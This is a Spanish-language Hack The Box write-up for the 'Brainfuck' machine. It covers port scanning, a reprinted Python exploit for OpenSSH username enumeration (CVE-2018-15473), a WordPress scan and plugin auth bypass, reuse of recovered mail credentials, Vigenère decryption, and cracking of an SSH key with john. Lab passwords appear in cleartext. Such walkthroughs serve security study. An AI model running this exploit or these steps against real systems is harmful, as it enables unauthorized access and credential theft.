# Brainfuck-HTB


## NMAP

Puertos abiertos

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/21ce5feb-f9e7-41da-b503-9c1cfb2bebff)


Vemos que se tiene virtual hosting.

## RCE

```
commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
```

Tenemos el http y el https.

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/89b75e5e-08df-4758-b78b-d628baadcca4)

Para ver el certificado y su informacion.
```
openssl s_client -connect 10.129.52.120:443
```

Encontramos un posible usuario orestis y admin.

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/e2410399-e035-4ec6-8dff-60d080f7ebff)


```
sslscan https://10.129.52.120/

```

### SSH enum (python3)

Utilicé este script para enumerar usuarios.

> https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py

``` python3
#!/usr/bin/env python3
"""
derived from work done by Matthew Daley
https://bugfuzz.com/stuff/ssh-check-username.py

props to Justin Gardner for the add_boolean workaround

CVE-2018-15473
--------------
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

Author: epi
    https://epi052.gitlab.io/notes-to-self/
    https://gitlab.com/epi052/cve-2018-15473
"""
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Union
from pathlib import Path

import paramiko

assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"


class Color:
    """ Class for coloring print statements.  Nothing to see here, move along. """
    BOLD = '\033[1m'
    ENDC = '\033[0m'
    RED = '\033[38;5;196m'
    BLUE = '\033[38;5;75m'
    GREEN = '\033[38;5;149m'
    YELLOW = '\033[38;5;190m'

    @staticmethod
    def string(string: str, color: str, bold: bool = False) -> str:
        """ Prints the given string in a few different colors.

        Args:
            string: string to be printed
            color:  valid colors "red", "blue", "green", "yellow"
            bold:   T/F to add ANSI bold code

        Returns:
            ANSI color-coded string (str)
        """
        boldstr = Color.BOLD if bold else ""
        colorstr = getattr(Color, color.upper())
        return f'{boldstr}{colorstr}{string}{Color.ENDC}'


class InvalidUsername(Exception):
    """ Raise when username not found via CVE-2018-15473. """


def apply_monkey_patch() -> None:
    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.

        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure

        _handler_table = {
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        }
    """

    def patched_add_boolean(*args, **kwargs):
        """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """

    auth_handler = paramiko.auth_handler.AuthHandler
    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

    def patched_msg_service_accept(*args, **kwargs):
        """ Patches paramiko.message.Message.add_boolean to produce a malformed packet. """
        old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
        retval = old_msg_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return retval

    def patched_userauth_failure(*args, **kwargs):
        """ Called during authentication when a username is not found. """
        raise InvalidUsername(*args, **kwargs)

    auth_handler._client_handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
    })


def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
    """ Small helper to stay DRY.

    Returns:
        socket.socket or None
    """
    # spoiler alert, I don't care about the -6 flag, it's really
    # just to advertise in the help that the program can handle ipv6
    try:
        return socket.create_connection((hostname, port))
    except socket.error as e:
        print(f'socket error: {e}', file=sys.stdout)


def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -> None:
    """ Connect and attempt keybased auth, result interpreted to determine valid username.

    Args:
        username:   username to check against the ssh service
        hostname:   hostname/IP of target
        port:       port where ssh is listening
        key:        key used for auth
        verbose:    bool value; determines whether to print 'not found' lines or not

    Returns:
        None
    """
    sock = create_socket(hostname, port)
    if not sock:
        return

    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        return print(Color.string(f'[!] SSH negotiation failed for user {username}.', color='red'))

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {Color.string(username, color='yellow')} found!")
    except InvalidUsername:
        if not verbose:
            return
        print(f'[-] {Color.string(username, color="red")} not found')


def main(**kwargs):
    """ main entry point for the program """
    sock = create_socket(kwargs.get('hostname'), kwargs.get('port'))
    if not sock:
        return

    banner = sock.recv(1024).decode()

    regex = re.search(r'-OpenSSH_(?P<version>\d\.\d)', banner)
    if regex:
        try:
            version = float(regex.group('version'))
        except ValueError:
            print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {regex.group("version")}')
        else:
            ver_clr = 'green' if version <= 7.7 else 'red'
            print(f"[+] {Color.string('OpenSSH', color=ver_clr)} version {Color.string(version, color=ver_clr)} found")
    else:
        print(f'[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: {Color.string(banner, color="yellow")}')    

    apply_monkey_patch()

    if kwargs.get('username'):
        kwargs['username'] = kwargs.get('username').strip()
        return connect(**kwargs)

    with multiprocessing.Pool(kwargs.get('threads')) as pool, Path(kwargs.get('wordlist')).open() as usernames:
        host = kwargs.get('hostname')
        port = kwargs.get('port')
        verbose = kwargs.get('verbose')
        pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")

    parser.add_argument('hostname', help='target to enumerate', type=str)
    parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
    parser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
    parser.add_argument('-v', '--verbose', action='store_true', default=False,
                        help="print both valid and invalid usernames (default: False)")
    parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")

    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
    multi_or_single_group.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
    multi_or_single_group.add_argument('-u', '--username', help='a single username to test', type=str)

    args = parser.parse_args()

    logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

    main(**vars(args))
```

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/7269c439-0d45-4941-827b-876b36061fbb)


### WordPress

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/aefb5f5b-64ac-4f82-9dbc-b6627527ace1)

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/1f135da2-5684-4f27-b142-6e08351449f3)

### WPSCAN y rutas 

Para este caso podemos ir y ver el codigo de la pagina que ya nos da pistas de los themes y los plug ins que se utilizan.

```
/wp-content/plugins
/wp-content/themes
/wp-login.php/

 wpscan -v --disable-tls-checks --plugins-detection aggressive --url  https://brainfuck.htb/


```

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/2a29a815-26fb-4107-a5c0-cccc70d578f4)


![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/36c48dc8-3dee-40fa-91e2-188bf04f271d)


![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/ba47a179-a1de-43e7-ae0f-695218176805)

Vamos a poner eso en un index.html y se supone que nos va a loggear como cualquier usuario sin credenciales. Tambien nos confirmo que existen ciertos usuarios que ya sabiamos.


![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/22dd2353-35d9-43f0-8253-4707c3e2dd75)


Dentro de los plugins existe el SMTP y ahi tenemos un password. ( Siempre que se tengas passwords intenta ver si se reutilizaron)


![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/f7a9ee70-9e43-416d-b542-ca29ebe34a15)

```
orestis:kHGuERB29DNiNE
```

### POP3 110 

Siempre que tengas este servicio intenta conectarte loggearte y leer correos esto funciona mas con telnet.

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop

```
nc IP port
telnet IP port

### Para checar los correos

+OK Dovecot ready.
user orestis
+OK
pass kHGuERB29DNiNE
+OK Logged in.


```


![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/f3e6f37f-8a32-41d4-bfb7-f51631104b38)

De nuevo vamos a probar que se reultizaran las credenciales tenemos un subdominio (s3cret).

```
username: orestis
password: kIEnnfEKJ#9UmdO
```

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/5a121173-e5ed-4a1c-aacf-a849d45eacd2)

Ahora tenemos una especie de cifrado. Cuando tienes el texto cifrado y el descifrado se puede calcular el password con el que se cifro e incluso que cifrado es. Probamos algunas paginas que nos ayudarian:

> https://quipqiup.com/

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/da838b08-3d9b-4f1c-9025-b469f3eff8f1)

Esta dificil adivinar pero bueno existe otra pagina. (vigenere)

> https://www.dcode.fr/cifrado-vigenere?__r=1.a143976822f08acbf1be3a46d2a08bc7



```
Qbqquzs - Pnhekxs dpi fca fhf zdmgzt

Orestis - Hacking for fun and profit


fuckmybrain
```

![image](https://github.com/gecr07/Brainfuck-HTB/assets/63270579/f4792885-fc08-4c26-9fd6-93fe4df2823b)



Entonces tal y como en el CEH decia si tienes el texto cifrado y el decifrado se puede hacer un ataque de fuerza bruta y obtener el pass...Ya con la clave nos descargamos una id_rsa.


```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

### HASH

La id_rsa se puede crackear

```
john -w /usr/share/wordlists/rockyou.txt hash
john --show hash
3poulakia!
```




























